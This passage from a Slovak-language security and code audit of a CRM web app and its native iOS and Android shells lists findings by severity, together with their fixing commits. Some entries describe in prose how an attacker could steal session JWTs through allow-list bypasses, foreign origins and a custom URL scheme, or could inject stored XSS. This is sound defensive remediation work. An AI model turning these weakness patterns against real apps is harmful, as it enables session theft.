| INFO | `client/src/context/WorkspaceContext.jsx:208` | switchWorkspace a value kontextu sa vytvaraju pri kazdom renderi - rozbijaju useCallback deps v App.jsx a restartuju effecty | Zbytocne re-registracie listenerov a restarty intervalu pri kazdej zmene workspace stavu; polling deep linku moze bezat dlhsie nez planovane 3 s. Vsetci konzumenti useWorkspace() sa re-renderuju aj ked sa ich data nezmenili. | `5a894a94` |
| INFO | `client/src/context/WorkspaceContext.jsx:304` | refreshCurrentWorkspace: try/catch, ktory chybu len znovu hodi (mrtvy kod) | Ziadny funkcny dopad; zbytocny kod, ktory pri citani vyvolava dojem osetrenia chyby. | `c0527aae` |
| INFO | `client/src/pages/AdminPanel.jsx:780` | Sťahovanie blobov cez odpojený <a> + okamžité revokeObjectURL namiesto existujúceho downloadBlob helpera | Nespoľahlivé sťahovanie CSV v iných prehliadačoch než Chrome; duplicitná logika na 5 miestach. | `9e548be9` |
| INFO | `client/src/pages/AdminPanel.jsx:3471` | Animácia `pulse` nie je definovaná v CSS – live indikátor sa nepulzuje | Kozmetické – zamýšľaný „live“ efekt chýba. | `82cf4315` |
| INFO | `client/src/pages/AdminPanel.jsx:5545` | Generátor promo kódov používa Math.random (nie kryptografický zdroj) | Predvídateľnosť PRNG znižuje entropiu kódov; pri úniku viacerých kódov je teoreticky možné odhadnúť ďalšie. | `40183892` |
| INFO | `client/src/pages/AdminPanel.jsx:6597` | „Skopírovať pre Claude“ vkladá do promptu PII (email používateľa, IP, User-Agent) | Potenciálny únik osobných údajov mimo systém; závisí od interných pravidiel spracovania. | `eaf6c130` |
| INFO | `client/src/pages/AdminPanel.jsx:6602` | navigator.clipboard.writeText bez feature guardu (TypeError mimo secure context) | Pri lokálnom/HTTP nasadení alebo starom prehliadači tlačidlo „Skopírovať pre Claude“ / „Skopírovať URL“ vyhodí nezachytenú výnimku. | `b8d852aa` |
| INFO | `client/src/pages/BillingPage.jsx:18` | Podmienený return pred volaním hookov (porušenie Rules of Hooks) | Latentná chyba a lint upozornenie; žiadny aktuálny runtime dopad. | `f63d1f31` |
| INFO | `client/src/pages/CRM.jsx:443` | Časovače highlight/scroll sa pri unmounte nerušia | Žiadny viditeľný dopad; drobná práca navyše po unmounte. | `fa758904` |
| INFO | `client/src/pages/CRM.jsx:716` | canPreview() vždy vracia true a stav uploadingFile sa nikdy nenastaví – mŕtve podmienky v JSX | Zavádzajúci kód (čitateľ predpokladá, že niektoré typy náhľad nemajú); nulový dopad na správanie. | `be88a64b` |
| INFO | `client/src/pages/CRM.jsx:2149` | PDF náhľad cez <object type="application/pdf"> – na iOS WebKit len prvá strana, v Android WebView vždy fallback | Viacstranové PDF vyzerá na iPhone/iPade ako jednostranové, používateľ nevie, že má použiť „Stiahnuť“ (share sheet → Quick Look). | `e411788d` |
| INFO | `client/src/pages/LandingPage.jsx:286` | Mŕtvy kód: IIFE vracajúca null v JSX cenníka | Žiadny funkčný dopad; zbytočný kód a zavádzajúci komentár. | `f1164cf5` |
| INFO | `client/src/pages/Messages.jsx:343` | Reťazce setTimeout v highlightMessage/showUnread nie sú zrušené pri unmount-e | Zbytočná práca po odchode zo stránky, potenciálny nečakaný scroll na inej obrazovke; v dlhých session-och drobné úniky. | `cbc7abd0` |
| INFO | `client/src/pages/Messages.jsx:717` | Lokálna formatFileSize zatieňuje import z utils/constants | Žiadny funkčný dopad teraz; riziko nekonzistentných hlášok a mŕtvy import. | `773a5418` |
| INFO | `client/src/pages/Tasks.jsx:1438` | Callback reťazce .then/.catch namiesto async/await (showUnread, read-for-related) | Len čitateľnosť/konzistencia; žiadny funkčný dopad. | `e1583026` |
| INFO | `client/src/pages/Tasks.jsx:1516` | Časovače zvýraznenia a scroll-retry sa pri unmounte nerušia | Zbytočná práca po navigácii preč; pri rýchlom návrate na stránku môže starší timer zrušiť nové zvýraznenie. Bez úniku pamäte (timery sú ohraničené). | `4d084b97` |
| INFO | `client/src/pages/Tasks.jsx:2510` | Mŕtvy kód a tieňovaný import v Tasks.jsx | Zbytočný kód v 3900-riadkovom komponente, mätúce dve verzie formatFileSize; žiadny runtime dopad. | `51d70d19` |
| INFO | `client/src/utils/fileDownload.js:81` | Callback reťazce .then/.catch namiesto async/await (fileDownload, CRM exportContactsCsv, uploadQueue start) | Čitateľnosť a konzistentné ošetrenie chýb; funkčný dopad nulový. | `ce47574e` |
| INFO | `client/src/utils/formatters.js:12` | formatDate/formatDateTime zobrazia doslovne 'Invalid Date' - toLocaleDateString pri neplatnom datume nehadze | V UI sa objavi anglicky text 'Invalid Date' namiesto pomlcky, najma na iOS/Safari pri datumoch v neISO formate. | `6504419c` |
| INFO | `client/src/utils/formatters.js:54` | formatRelativeTime vrati 'prave teraz' pre akykolvek datum v buducnosti a pre neplatny datum | Zavadzajuce zobrazenie casu pri buducich terminoch. | `6504419c` |

**Natívne appky (iOS Swift, Android Kotlin) — 35 nálezov**

| Závažnosť | Súbor:riadok | Čo bolo zlé | Prečo to vadilo | Commit |
|---|---|---|---|---|
| VYSOKÁ | `ios/PrplCRM/ContentView.swift:398` | Keychain JWT sa cez WKUserScript zapisuje do localStorage KAŽDÉHO originu načítaného v hlavnom frame | Cudzí dokument zobrazený vo WKWebView (JS redirect, 302 na HTML, host typu prplcrm.eu.attacker.tld, kompromitovaný push payload) dostane platný JWT používateľa do svojho localStorage → krádež session a plný prístup k dátam účtu. | `54d3331d` |
| VYSOKÁ | `ios/PrplCRM/ContentView.swift:864` | Po odhlásení ostáva token zapečený v WKUserScript a pri ďalšom plnom načítaní stránky session obnoví | Na zdieľanom zariadení sa po explicitnom odhlásení používateľa A môže jeho session ticho obnoviť (po čase na pozadí alebo pamäťovom tlaku) a používateľ B pracuje v cudzom účte; odhlásenie nie je spoľahlivé. | `54d3331d` |
| VYSOKÁ | `ios/PrplCRM/ContentView.swift:1327` | Navigačný allow-list používa substring `contains` a povoľuje ne-linkové navigácie na cudzie hosty vo WebView | Phishingová stránka s podobným hostom beží v dôveryhodnom shelli appky (bez adresného riadku); cudzí dokument v hlavnom frame získa JWT (native-ios-01). Výpadok API s HTML odpoveďou (Render 502 page) tiež skončí ako dokument cudz… | `54d3331d` |
| STREDNÁ | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:226` | Callback obnovy z Block Store beží aj po zničení Activity → launch() na odregistrovanom ActivityResultLauncher padne | Pád appky krátko po odchode zo splashu pri prvom spustení / expirovanom tokene; v Diagnostike sa neobjaví (natívna výnimka mimo WebView). | `3841035d` |
| STREDNÁ | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:479` | Obídenie host-allowlistu v shouldOverrideUrlLoading cez prefix „https://prplcrm.eu…“ | Phishingová stránka sa zobrazí ako súčasť Prpl CRM (bez URL baru); v kombinácii s pretekom pri odoberaní NativeBridge potenciálne `window.NativeBridge.getAuthToken()` z cudzieho originu. | `3841035d` |
| STREDNÁ | `android-native/app/src/main/java/eu/prplcrm/app/TokenStore.kt:27` | TokenStore vytvára MasterKey + EncryptedSharedPreferences pri každom volaní, na UI vlákne a bez try/catch | Na postihnutých zariadeniach crash-loop pri štarte (appka nepoužiteľná bez vymazania dát); na všetkých zariadeniach zbytočný jank pri štarte, pri každom načítaní stránky a pri každom resume (opakovaná Keystore/Tink inicializácia … | `3841035d` |
| STREDNÁ | `android-native/app/src/main/java/eu/prplcrm/app/WebAppInterface.kt:68` | Pri odhlásení sa FCM zariadenie neodregistruje – push notifikácie predošlého používateľa chodia ďalej | Na zdieľanom / vrátenom zariadení vidí ďalší držiteľ názvy úloh, správy a mená z notifikácií odhláseného používateľa (title/body na zamknutej obrazovke) až kým sa neprihlási iný účet (vtedy upsert podľa `fcmToken` presunie mappin… | `3841035d` |
| STREDNÁ | `ios/PrplCRM/PrivacyInfo.xcprivacy:39` | Privacy manifest nedeklaruje File Timestamp API, ktoré appka používa (creationDateKey) | App Store Connect pri uploade hlási ITMS-91053 „Missing API declaration“; od mája 2024 môže byť build odmietnutý alebo review zdržané. | `000f2e88` |
| STREDNÁ | `ios/PrplCRM/PrplCRMApp.swift:73` | Custom URL scheme `prplcrm://auth?token=` prijme ľubovoľný token bez väzby na flow iniciovaný appkou (login CSRF / únos APNs) | Útočník s vlastným platným JWT (vlastný účet) previaže APNs token obete na svoj účet (push.js `findOneAndUpdate` podľa deviceToken) – obeť prestane dostávať svoje notifikácie a dostáva cudzie; po odhlásení obete / pri ďalšom cold… | `2cd5573e` |
| STREDNÁ | `ios/PrplCRM/PrplCRMApp.swift:81` | Login cez `prplcrm://auth?token=` pri už bežiacej appke nefunguje – token sa do WebView nikdy nedostane | Používateľ, ktorý sa prihlási cez Safari OAuth so spustenou appkou, skončí na /login napriek úspešnému prihláseniu; funguje až po kill + cold start appky. | `54d3331d` |
| STREDNÁ | `ios/PrplCRM/StoreKitManager.swift:93` | Transakcia sa finishuje PRED overením backendom a pri zlyhaní /verify sa nič neopakuje – zaplatené predplatné ostane neaktivované | Používateľ zaplatí Apple, ale plán ostane `free`; reklamácie/refundy a strata dôvery; nutná manuálna intervencia podpory. | `b7d41c63` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:266` | Deep link z onNewIntent počas čakania na Block Store obnovu prepíše neskorší proceedToWeb(startUrl) | Ťuknutie na notifikáciu tesne po studenom štarte otvorí dashboard namiesto cieľovej úlohy/správy. | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:359` | Third-party cookies sú vo WebView zapnuté bez reálnej potreby | Zbytočne rozšírený povrch pre sledovanie a cross-site cookies v embedovanom obsahu (iframy, externé zdroje), bez prínosu pre funkčnosť. | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:502` | NativeBridge sa pridáva/odoberá až v onPageStarted – podľa dokumentácie sa zmena prejaví až pri ďalšom načítaní | Ak cudzí origin skončí vo WebView a odobratie sa stihne neprejaviť, stránka vie zavolať `getAuthToken()` (JWT) a `setAuthToken()`. Pri prvom načítaní zasa riziko, že bridge nebude dostupný až do reloadu (SPA nikdy nereloaduje). | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:519` | Token a workspaceId sa vkladajú do JS reťazca bez escapovania | Tichý výpadok auto-loginu pri nečakanej hodnote; teoreticky perzistentné spustenie JS pri každom načítaní stránky (hodnota prežíva v šifrovaných prefs). | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:617` | Všetky console správy web appky sa v release buildoch logujú do logcatu | Únik osobných údajov / obsahu CRM do systémových logov a bug reportov zariadenia. | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/MainActivity.kt:960` | http:// odkaz na vlastnú doménu skončí v nekonečnom opakovaní prekrytia (ERR_CLEARTEXT_NOT_PERMITTED je ERROR_UNKNOWN) | Používateľ, ktorý klikne na starý http:// odkaz (e-mail, dokument), uviazne na chybovej obrazovke; falošný incident v Diagnostike. | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/PrplFcmService.kt:55` | Push v popredí sa zahodí bez ohľadu na to, či je web appka naozaj pripojená (socket) a načítaná | Notifikácia sa stratí (ani v systémovej lište, ani v appke), keď je appka v popredí, ale web nie je pripojený. | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/RestoreSession.kt:37` | issueAfterLogin zdieľa 3-sekundový OkHttp timeout určený pre splash – obnovovací token sa pri pomalom serveri potichu nevydá | Zero-tap prihlásenie (požiadavka Google Play) po reinštalácii / na novom telefóne nefunguje pre používateľov, ktorým sa login trafil do pomalej odpovede servera; nič sa nedozvedia, nič sa nenahlási. | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/WebAppInterface.kt:113` | saveFile: pri zlyhaní zápisu ostane v MediaStore osirelý „pending“ záznam; legacy vetva ticho prepíše rovnomenný súbor | Hromadenie nepoužiteľných záznamov v MediaStore pri opakovaných chybách; na starých Androidoch strata predtým stiahnutého súboru s rovnakým názvom. | `3841035d` |
| NÍZKA | `android-native/app/src/main/java/eu/prplcrm/app/WebAppInterface.kt:119` | Android 7–9: WRITE_EXTERNAL_STORAGE je deklarované, ale nikdy nevyžiadané za behu → sťahovanie vždy zlyhá | Na Androide 7.0–9 (minSdk 24 je podporovaný) sa nedá stiahnuť žiadna príloha ani ZIP export – používateľ vidí len chybovú hlášku. | `3841035d` |
| NÍZKA | `ios/PrplCRM/ContentView.swift:78` | Biometrický zámok je len vizuálny a aktivuje sa iba pri cold starte | Kto zoberie odomknutý telefón s appkou na pozadí, dostane sa do CRM bez Face ID; ochrana zodpovedá len bežnému zámku zariadenia, hoci UI naznačuje viac. | `54d3331d` |
| NÍZKA | `ios/PrplCRM/ContentView.swift:308` | WKKeyboardDisplayFix swizzluje privátny WebKit selektor – tichý výpadok pri zmene iOS a riziko App Review | Regres UX (nemožnosť pomenovať prílohu po výbere z galérie) pri budúcom iOS bez signálu v Diagnostike; potenciálny problém pri App Review. | `54d3331d` |
| NÍZKA | `ios/PrplCRM/ContentView.swift:846` | Bridge `openExternal` otvorí ľubovoľnú URL schému bez allow-listu | XSS na webe sa v natívnom shelli zmení na spustenie hovoru/SMS/inštalácie profilu alebo na tichú zmenu Keychain tokenu cez vlastnú schému. | `54d3331d` |
| NÍZKA | `ios/PrplCRM/ContentView.swift:1215` | Hlásenia do Diagnostiky obsahujú plnú URL vrátane query – môže uniknúť reset/invite token | Jednorazový reset-hesla/pozvánkový token (prípadne `_t`, `highlightTask`, `ws` identifikátory) skončí v admin Diagnostike a logoch; pri jetsame na tejto stránke je možný reset hesla cudzej osoby administrátorom/útočníkom s prístu… | `54d3331d` |
| NÍZKA | `ios/PrplCRM/ContentView.swift:1273` | JS alert()/confirm() sa prezentujú cez rootViewController – ak už niečo prezentuje, dialóg sa nezobrazí a completion handler sa nikdy nezavolá | Ak web zavolá `confirm()` (napr. potvrdenie mazania) kým je otvorený share sheet alebo iný natívny dialóg, stránka zamrzne na danom volaní; pomôže len reload. | `54d3331d` |
| NÍZKA | `ios/PrplCRM/Info.plist:56` | ATS: `NSAllowsArbitraryLoadsInWebContent = true` povoľuje nešifrovaný HTTP obsah vo WebView | Mixed content / cleartext zdroje vo WebView sú povolené → MITM na verejnej Wi-Fi môže podstrčiť skript do stránky (a tým sa dostať k tokenu). App Store review môže žiadať zdôvodnenie. | `000f2e88` |
| NÍZKA | `ios/PrplCRM/Info.plist:65` | Chýba `NSPhotoLibraryAddUsageDescription` – share sheet „Uložiť obrázok/video“ môže zlyhať (neoverené) | Pri výbere „Uložiť obrázok“ zo share sheetu môže systém akciu odmietnuť alebo appku ukončiť pre chýbajúci usage string. | `000f2e88` |
| NÍZKA | `ios/PrplCRM/OAuthController.swift:252` | OAuthController loguje cez `print` namiesto `debugLog` – výpisy ostávajú aj v Release builde | Diagnostické správy o prihlasovaní (vrátane chybových textov backendu) sú čitateľné v Console.app pripojeného zariadenia aj v App Store builde. | `000f2e88` |
| NÍZKA | `ios/PrplCRM/PrplCRMApp.swift:130` | APNs registrácia a prepis Keychainu pri KAŽDOM načítaní stránky, aj keď sa token nezmenil | Zbytočná záťaž API (upsert + deleteMany) a Keychainu; pri nestabilnej sieti sa spúšťa aj 5-krokový exponenciálny retry pre registráciu, ktorá už existuje. | `54d3331d` |
| INFO | `android-native/app/build.gradle.kts:99` | Alpha verzia zastaranej knižnice security-crypto v produkcii a nepoužitá závislosť androidx.biometric | Riziko známych chýb alpha knižnice v jadre ukladania tokenov (viď native-android-01) a zbytočná veľkosť balíka. | `3841035d` |
| INFO | `android/twa-manifest.json:20` | Absolútna lokálna cesta ku keystore prezrádza meno vývojára a starý názov produktu | Únik informácií o vývojovom prostredí (meno účtu, štruktúra adresárov) v repozitári; build funguje len na jednom stroji. | `e661489c` |
| INFO | `android/twa-manifest.json:20` | Legacy TWA projekt: lokálna cesta vývojára so starým názvom „purple crm“ v repozitári; allowBackup=true; nahradený natívnym shellom | Mätúce dve Android implementácie v repozitári; náhodný `bundleRelease` z `android/` by vyprodukoval AAB s nižším versionCode (Play ho odmietne) alebo by sa omylom publikoval zastaraný TWA; únik lokálnej cesty/mena. | `e661489c` |
| INFO | `ios/PrplCRM/ContentView.swift:629` | Mŕtva vetva: `pendingDeepLinkJS` sa nikde nenastavuje, „safety net“ v didFinish nikdy nebeží | Falošná záruka v kóde; pri budúcom debugovaní stratených deep linkov sa môže čas stratiť na neexistujúcej ceste. | `54d3331d` |
| INFO | `ios/PrplCRM/PrplCRMApp.swift:318` | Mŕtvy kód: `applicationDidBecomeActive` v scene-based SwiftUI appke sa nikdy nevolá | Zavádzajúce pre údržbu – budúce úpravy čistenia badge sa môžu omylom robiť na mŕtvom mieste a nikdy sa neprejavia. | `54d3331d` |

**Nasadenie a repozitár (render.yaml, .gitignore) — 3 nálezov**

| Závažnosť | Súbor:riadok | Čo bolo zlé | Prečo to vadilo | Commit |
|---|---|---|---|---|
| STREDNÁ | `render.yaml:46` | Frontend statický web nemá žiadne bezpečnostné hlavičky — helmet CSP na API dokument nikdy nechráni | Aplikácia na prplcrm.eu sa dá vložiť do cudzieho iframe (clickjacking), XSS ochrana cez CSP reálne neexistuje napriek komentáru v kóde; prípadné prenesenie serverovej CSP 1:1 by rozbilo PDF náhľad. | `c79f3435` |
| NÍZKA | `.gitignore:4` | Build artefakty `client/dist` a `client/dev-dist` sú commitnuté napriek `dist` v .gitignore | Zastaraný service worker a shell v repozitári, šum v diffoch pri každom dev/build behu, riziko nasadenia starého `sw.js` pri deploy bez buildu. Render buildí `dist` nanovo (`npm run build`), produkcia dnes postihnutá nie je. | `dde5f7c4` |
| INFO | `render.yaml:55` | Poradie header pravidiel: Cache-Control pre .well-known je za catch-all `/*` | Asociačné súbory sa servírujú s `no-cache` namiesto 1-dňovej cache — funkčne neškodné, ale konfigurácia nerobí to, čo komentár tvrdí (zavádzajúce pri ladení Universal Links / App Links). | `c79f3435` |

Opravy nad rámec zoznamu nálezov (nájdené počas opráv):

- `server/services/adminEmailService.js:318` — e-mail na obnovu hesla sa neodosielal (nedeklarovaná premenná `html`).
- `server/routes/emailUnsubscribe.js:64` — stránka potvrdenia odhlásenia vkladala e-mail do HTML bez escapovania (stored XSS v spojení s nálezom `srv-auth-04`).
- `server/index.js` (gracefulShutdown) — zastavenie periodických jobov pred zatvorením DB; v druhej vlne doplnené `stop()` pre všetky zvyšné plánovače a zatvorenie APNs spojení.
- `server/routes/errors.js:78` — nový endpoint `POST /api/errors/csp` na zber CSP porušení (súčasť zavedenia CSP pre statický web).
- `server/utils/backgroundJobs.js` + `server/routes/jobs.js` — beh dlhého Google `/sync` na pozadí (202 + polling `GET /api/jobs/:id`).
- `client/src/hooks/useSocket.js` — jedno zdieľané Socket.IO spojenie pre celú aplikáciu.

### 4.2 Zoznam commitov

| Commit | Popis |
|---|---|
| `3c706641` | fix(email): e-mail na obnovenie hesla sa nikdy neodoslal — nedeklarovaná premenná `html` |
| `51b0ae68` | fix(admin): export provízií do CSV sa reálne stiahne (adminApi + Bearer namiesto window.open) |
| `2b7479e9` | fix(admin): zmena plánu v tabuľke používateľov už neotvára detail modal |
| `1566be9b` | fix(admin): smart pause pri scrollovaní v Live aktivite sa reálne zapne |
| `82161922` | fix(admin): prístup k sessionStorage s adminToken obalený try/catch |
| `dbbd8c85` | fix(admin): debounce hľadania a ochrana pred stale odpoveďou v Používateľoch a Workspace-och |
| `55527b6a` | fix(admin): výber používateľov pre hromadnú akciu sa nuluje pri zmene strany a filtrov |
| `ccbe8b5b` | fix(admin): detail modaly a graf využitia ignorujú oneskorené odpovede starších requestov |
| `9e548be9` | fix(admin): CSV exporty cez downloadBlob helper a s ošetrením chyby |
| `b5ae6096` | fix(admin): klientské CSV exporty chránené proti CSV/formula injection |
| `c571173e` | fix(admin): auto-refresh Live aktivity sa rozbehne aj pri prázdnom feede |
| `62fcfb9c` | fix(admin): hodinový graf API metrík zobrazuje lokálne hodiny namiesto UTC |
| `4c2a709d` | fix(admin): hľadanie v Diagnostika → Chyby sa odošle až po Enter / „Hľadať“ |
| `1ed64564` | fix(admin): Diagnostika → Aktívni nepolluje pri schovanom tabe |
| `40183892` | fix(admin): generátor promo kódov používa crypto.getRandomValues namiesto Math.random |
| `b8d852aa` | fix(admin): feature guard pre navigator.clipboard pri kopírovaní (QR URL, prompt pre Claude) |
| `fe96453d` | fix(notifikácie): sekcia push nastavení viditeľná aj na Android TWA/PWA, iOS PWA a Android natív |
| `93584beb` | fix(notifikácie): klik na toast prenesie workspaceId notifikácie do URL (ws=) |
| `5bd24a61` | perf(user-menu): poll unread-by-workspace beží len pri otvorenom dropdowne |
| `63c4c21e` | fix(user-menu): Enter pri vytváraní prostredia rešpektuje guard proti dvojitému odoslaniu |
| `a0054502` | fix(sw-push): DEBUG logovanie service workera len na localhost |
| `1546167f` | fix(notifikácie): odpoveď jedného toggle-u neprepíše optimistický stav druhého |
| `ba719485` | fix(notifikácie): čítanie/zápis localStorage v renderi ošetrené try/catch |
| `9376d0fd` | fix(user-menu): kopírovanie feed URL čaká na clipboard a má fallback |
| `62e9eb8b` | fix(user-menu): upload avatara cez axios s timeoutom a ošetrením prerušenia |
| `80f9b80b` | fix(user-menu): mobilné prepnutie prostredia hlási chybu namiesto tichého zlyhania |
| `3ed4397c` | fix(user-menu): „Uložiť zmeny“ a „Zmeniť heslo“ majú in-flight stav proti dvojitému odoslaniu |
| `1f36f1ce` | fix(prostredia): zlyhanie prepnutia prostredia v prepínači hlási chybu |
| `46630072` | fix(push): initializePush registruje SW 'message' listener len raz |
| `ec79c47f` | fix(push): cleanup 2 s timera bannera povolenia sa naozaj vykoná |
| `3e463132` | fix(členovia): správny názov propu onUserUpdate pre UserMenu |
| `abfad5d2` | fix(pozvánky): effect načítania pozvánky nezávisí od nestabilnej switchWorkspace |
| `919f2e28` | fix(členovia): zlyhanie načítania členov zobrazí chybu a tlačidlo „Skúsiť znova“ |
| `f81beea5` | refactor(notifikácie): načítanie preferencií cez async/await namiesto promise reťazca |
| `2843bd41` | fix(notifikácie): auto-dismiss timery toastov sa pri unmounte rušia |
| `6dc316c8` | fix(pozvánky): po prijatí pozvánky je switch best-effort a presmerovanie sa dá zrušiť |
| `7c404b51` | fix(pozvánky): adresa prplcrm.eu v iOS inštrukciách nie je odkaz, ktorý skočí na /app |
| `47e0d8d0` | refactor(user-menu): odstránenie mŕtveho kódu — nepoužité `token` a importy |
| `1bae4cf5` | fix(app): RouteErrorBoundary hlási chyby do Diagnostiky a pri stale chunku reloadne |
| `5611a979` | fix(app): WorkspaceSetup neprekrýva verejné stránky vrátane /invite/:token |
| `78e34d06` | fix(socket): neobmedzený počet reconnect pokusov — realtime po výpadku siete ožije |
| `0f78581a` | fix(diagnostika): error report neposiela JWT/reset/invite tokeny z URL |
| `44d09f52` | fix(workspace): prístup k window.sessionStorage/localStorage v try — blokované cookies nezhodia requesty |
| `dd3ae0b8` | fix(app): sessionStorage pre pendingDeepLink v try/catch — blokovaný storage nezhodí strom |
| `f5f42108` | fix(app): tlačidlo „Obnoviť stránku" v AppErrorBoundary naozaj reloadne stránku |
| `5abcbc0e` | fix(diagnostika): patchnutý console.error/warn nehádže pri neserializovateľnom argumente |
| `83f0ee5b` | fix(diagnostika): unhandledrejection handler nehádže pri cyklickom/BigInt dôvode |
| `faf3295f` | fix(app): <Navigate> redirecty s replace — tlačidlo Späť už nevedie do slučky /login → /app |
| `bc6037fa` | fix(diagnostika): ui.click breadcrumb neposiela innerText s osobnými údajmi |
| `c0527aae` | refactor(workspace): refreshCurrentWorkspace bez mŕtveho try/catch |
| `6504419c` | fix(formatters): neplatný dátum vráti '-'/'' namiesto 'Invalid Date', budúci dátum nie je 'práve teraz' |
| `f1b2cec1` | fix(app): loadery RouteFallback/LoadingGate na mobile vycentrované — 100dvh namiesto 100vh |
| `72b99fe1` | fix(workspace): zastaraná odpoveď fetchWorkspaces neprepíše výsledok neskoršieho switchWorkspace |
| `5a894a94` | perf(workspace): akcie WorkspaceContextu cez useCallback a value cez useMemo |
| `f9bfe8b3` | fix(formatters): formatRelativeTime toleruje 60 s posun hodín pri budúcom dátume |
| `b9baf42f` | fix(crm): hlásenie chyby pri zlyhaní mazania kontaktu |
| `ff5e2e48` | fix(crm): mutácie kontaktov aktualizujú zoznam z odpovede servera, nie len cez socket |
| `d9d8b3fc` | fix(crm): zobrazenie chyby načítania kontaktov s tlačidlom „Skúsiť znova" |
| `993b4ee2` | fix(crm): zrušenie neaktuálneho načítania náhľadu súboru (openPreview) |
| `2af13d9d` | fix(files): „Stiahnuť" z náhľadu použije už načítaný blob a pri chybe upozorní |
| `e8a2a4ca` | fix(attachments): reset výberu a filtrov pri prepnutí pracovného prostredia |
| `d811f339` | fix(download): odložené uvoľnenie blob URL vo web vetve (Safari) |
| `ecfd8889` | perf(upload): emit priebehu len pri zmene zaokrúhleného percenta |
| `0572c6f3` | fix(contact-detail): normalizácia schémy odkazu na webstránku kontaktu |
| `d4c0049d` | fix(file-rename): maxLength názvu súboru podľa limitu servera (200 znakov) |
| `2b091954` | fix(crm): jednotný zoznam textových prípon v náhľade a odstránenie tieniaceho formatFileSize |
| `22172553` | fix(crm): tlačidlo „+ Nový kontakt" v prázdnom stave neotvára mobilný sidebar |
| `d20a5853` | fix(crm): ochrana renderu avataru pred kontaktom bez mena |
| `edd18a44` | perf(crm): index globálnych projektov podľa kontaktu namiesto prechádzania celého zoznamu |
| `fa758904` | chore(crm): zrušenie časovačov highlight/scroll pri unmounte stránky |
| `be88a64b` | refactor(crm): odstránenie mŕtvych podmienok canPreview a uploadingFile |
| `ce47574e` | refactor(client): prepis .then/.catch reťazcov na async/await (fileDownload, CRM, uploadQueue) |
| `9ed22ed5` | fix(crm): createContact nepridá kontakt z iného prostredia pri prepnutí počas požiadavky |
| `351f76d8` | fix(messages): obnoviť zoznam po odoslaní správy zo záložky Odoslané |
| `4409934a` | fix(messages): nestratiť rozpísanú úpravu správy pri refreshi na pozadí |
| `6cbcb4e7` | fix(announcement): zámok scrollu tela a Escape pre modal oznamu |
| `72b96be0` | fix(help): ošetriť prístup HelpGuide k localStorage pri zablokovanom úložisku |
| `6840ad12` | fix(dashboard): počúvať skutočné socket udalosti správ |
| `60688c4c` | fix(messages): ignorovať zastaranú odpoveď fetchMessages pri prepínaní záložiek |
| `9fa32b87` | fix(header): nepollovať neprečítané na pozadí a obnoviť bodku po návrate |
| `ff1616f2` | fix(dashboard): náhľad textu správy čítať z description namiesto neexistujúceho body |
| `edf20e10` | fix(messages): in-flight guard hlasovania v ankete proti dvojitému ťuknutiu |
| `231c6e57` | perf(dashboard): memoizovať kontakty s projektami a zoradené nesplnené projekty |
| `4143071c` | fix(ui): väčšie dotykové ciele filtrov stavu, ikon komentára a reakcií |
| `4efe6592` | fix(messages): oneskorená odpoveď detailu neprepíše inú/zavretú správu |
| `1d46a769` | fix(messages): zámok scrollu tela pre modal Nová správa a dialóg zamietnutia |
| `60b01fc4` | fix(messages): správne popisky Od/Pre a prázdny stav na záložke Všetky |
| `1d4e2438` | fix(messages): ošetriť chybu pri sťahovaní legacy prílohy správy |
| `cbc7abd0` | chore(messages): zrušiť časovače zvýraznenia pri odpojení stránky |
| `773a5418` | refactor(messages): odstrániť lokálnu formatFileSize zatieňujúcu import z utils |
| `d5af8c84` | fix(tasks): CSV export kontroluje HTTP status a sťahuje cez downloadBlob |
| `a0b609f2` | fix(tasks): denný pohľad kalendára posiela do onTaskClick položku, nie rodičovský projekt |
| `d84fa473` | fix(tasks): ochrana fetchTasks/fetchContacts proti zastaranej odpovedi |
| `24b8ff3a` | fix(tasks): termín 'YYYY-MM-DD' sa parsuje ako lokálny deň, nie UTC polnoc |
| `7f077994` | fix(tasks): addSubtask chránený proti dvojitému odoslaniu |
| `e6b85cff` | fix(tasks): resync poradia zo servera po zlyhaní drag-and-drop reorderu |
| `31d939ac` | fix(tasks): banner filtra kontaktu neukazuje „Načítavam..." natrvalo |
| `bd908479` | fix(tasks): tlačidlo „Duplikovať" je počas requestu zablokované |
| `e1583026` | refactor(tasks): efekty notifikácií prepísané z .then/.catch na async/await |
| `4d084b97` | fix(tasks): časovače zvýraznenia a scroll-retry sa pri unmounte zrušia |
| `51d70d19` | chore(tasks): odstránenie mŕtveho kódu a tieňovaného importu |
| `f8e9b5c5` | fix(affiliate): správny názov propu onUserUpdate pre UserMenu |
| `1d216268` | fix(vop): krížový odkaz v bode 10.2 zachováva ?from=register |
| `76d2614b` | fix(landing): mobilné menu zamyká scroll pozadia a zatvára sa cez Escape |
| `d22d2633` | fix(landing): kontaktný formulár sa pri timeoute neopakuje automaticky |
| `f1164cf5` | refactor(landing): odstránenie mŕtvej IIFE v JSX cenníka |
| `1988d89e` | fix(affiliate): responzívny formulár bankových údajov a IBAN bez autokorekcie |
| `18ff444a` | fix(css): malé × a rozbaľovacie tlačidlá sa na dotyku nenafukujú na 44px |
| `cdee2016` | fix(css): hlavička na telefóne rešpektuje safe-area-inset-top v PWA a WebView |
| `1c8f9fe1` | fix(css): odkazy na neexistujúce tokeny a neplatný box-shadow menu blokov |
| `b755f6de` | fix(css): toasty rešpektujú safe-area-inset-top v standalone PWA |
| `cdce137b` | fix(css): spodok user-menu na mobile nekončí za spodnou navigáciou |
| `2dbde661` | fix(úlohy): väčšia dotyková plocha checkboxu podúlohy na mobile |
| `48672bf3` | fix(kalendár): odstránené dark-mode prepisy bez existencie tmavej témy |
| `151565d4` | feat(css): rešpektovanie prefers-reduced-motion pre animácie a prechody |
| `36d52145` | fix(landing): hamburger menu a cookie tlačidlá majú 44px dotykový cieľ |
